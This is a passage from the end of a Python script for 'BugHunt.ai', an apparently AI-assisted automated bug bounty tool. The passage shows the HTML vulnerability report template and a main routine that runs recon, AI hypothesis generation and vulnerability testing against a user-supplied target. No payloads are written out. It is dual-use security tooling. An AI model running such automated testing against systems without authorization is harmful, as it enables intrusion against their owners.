            <span class="sev-badge" style="background:{color};color:#000;">{sev.upper()}</span>
            <strong>{vuln['vuln_type']}</strong> @ <code>{vuln['endpoint']}</code>
        </h3>
        <div class="vuln-detail"><strong>Reason:</strong> {vuln.get('reason', 'N/A')}</div>
        <div class="vuln-detail"><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</div>
        <div class="vuln-detail">
            <strong>Payload:</strong>
            <pre>{vuln.get('payload', 'N/A')}</pre>
        </div>
        <div class="vuln-detail">
            <strong>Proof of Concept:</strong>
            <pre>{vuln.get('poc', 'N/A')}</pre>
        </div>
        <div class="vuln-detail">
            <strong>Response Sample:</strong>
            <pre>{str(vuln.get('response_sample', 'N/A'))[:400]}</pre>
        </div>
    </div>
"""

    html += """
    <div class="footer">
        <p>Generated by BugHunt.ai v2.0 - Automated Bug Bounty Framework</p>
        <p style="margin-top:5px;color:#555;">Groq AI Edition (Free) · Always verify findings manually before submitting 🔓</p>
    </div>
</div>
</body>
</html>
"""
    return html

# ============ MAIN ============

async def main():
    if len(sys.argv) < 2:
        print("""
╔═══════════════════════════════════════╗
║      🔓 BugHunt.ai v2.0               ║
║   Automated Recon Framework           ║
║   Groq Edition (FREE)                 ║
╚═══════════════════════════════════════╝

Usage:
  python3 bughunt_groq.py setup              # Install tools
  python3 bughunt_groq.py hunt <target>      # Run hunt
  python3 bughunt_groq.py hunt <target> <scope.txt>

Example:
  export GROQ_API_KEY="your-key"
  python3 bughunt_groq.py hunt target.com
  python3 bughunt_groq.py hunt target.com scope.txt

Get free Groq API key: https://console.groq.com
""")
        sys.exit(1)

    cmd = sys.argv[1]

    if cmd == "setup":
        setup()
        return

    if cmd == "hunt":
        if len(sys.argv) < 3:
            print("Usage: python3 bughunt_groq.py hunt <target> [scope.txt]")
            sys.exit(1)

        raw_target = sys.argv[2]
        if "://" in raw_target:
            parsed = urlparse(raw_target)
            target = parsed.netloc or parsed.path
        else:
            target = raw_target

        scope_file = sys.argv[3] if len(sys.argv) > 3 else None
        scope = open(scope_file).read() if (scope_file and os.path.exists(scope_file)) else target

        print(f"""
╔═══════════════════════════════════════╗
║   🔍 BugHunt.ai v2 - Auto Recon       ║
║   Target: {target:<24} ║
║   Groq: FREE AI Powered               ║
╚═══════════════════════════════════════╝
""")

        recon_data   = recon(target)
        filtered     = filter_scope(recon_data, scope)
        hypotheses   = get_hypotheses(filtered, target)

        if not hypotheses:
            print("[!] No hypotheses generated. Check GROQ_API_KEY.")
            # Still run nuclei even without hypotheses
            hypotheses = []

        vulns = await test_all(target, hypotheses, filtered["urls"])
        html  = generate_report(target, vulns, filtered)

        filename = f"{target.replace('.', '_')}_report.html"
        with open(filename, "w") as f:
            f.write(html)

        print(f"""
╔═══════════════════════════════════════╗
║   ✅ Hunt Complete!                   ║
║   Report: {filename:<24} ║
║   Findings: {len(vulns):<26} ║
╚═══════════════════════════════════════╝
""")
        print(f"[+] firefox {filename}\n")

if __name__ == "__main__":
    if sys.platform.lower().startswith("win"):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
